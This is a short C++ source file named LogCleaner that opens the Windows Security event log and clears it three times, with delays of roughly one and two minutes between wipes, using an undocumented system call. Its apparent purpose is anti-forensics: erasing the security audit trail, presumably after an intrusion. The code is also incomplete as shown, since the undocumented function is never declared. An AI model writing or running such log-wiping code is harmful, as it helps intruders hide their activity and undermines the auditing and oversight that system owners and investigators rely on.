// LogCleaner.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <winbase.h>

typedef LONG NTSTATUS;
char* VERSION_NO = "1.0";

int main()
{
	HANDLE eventlog = NULL;

	eventlog = OpenEventLogA(NULL, "Security");
	ElfClearEventLogFileW(eventlog, NULL);

	Sleep(65000);

	eventlog = OpenEventLogA(NULL, "Security");
	ElfClearEventLogFileW(eventlog, NULL);

	Sleep(125000);

	eventlog = OpenEventLogA(NULL, "Security");
	ElfClearEventLogFileW(eventlog, NULL);

    return 0;
}

